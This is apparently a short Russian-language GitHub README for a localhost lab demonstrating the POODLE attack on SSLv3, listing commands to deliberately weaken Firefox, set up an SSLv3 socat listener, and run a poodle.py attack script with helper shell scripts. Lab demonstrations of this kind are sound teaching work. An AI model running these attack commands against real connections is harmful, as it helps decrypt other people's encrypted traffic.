# showcase-of-ssl

# устанавливаю уязвимость в конфиге браузера firefox
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/64956cb1-ffe1-43bc-a49d-1dd40c78476d)

# создание связи между сервером и ssl listener
socat -v -x OPENSSL-LISTEN:4433,verify=0,method=SSLv3,cert=cert-poodle.pem,key=key-poodle.pem,reuseaddr,fork TCP:localhost:4080

# для использования стандартных правил iptables
./poodle.py --target-port 4433 --start-offset 384 https://localhost:8443

# создание 3х терминалов 
./poodle-dev.sh httpserver
./poodle-dev.sh sslserver
./poodle-dev.sh attacker-nodebug

# подтверждаем самостоятельно сделанные сертификаты 

# проводим свою атаку
$ ./poodle.py --target-port 4433 --start-offset 384 https://localhost:8443
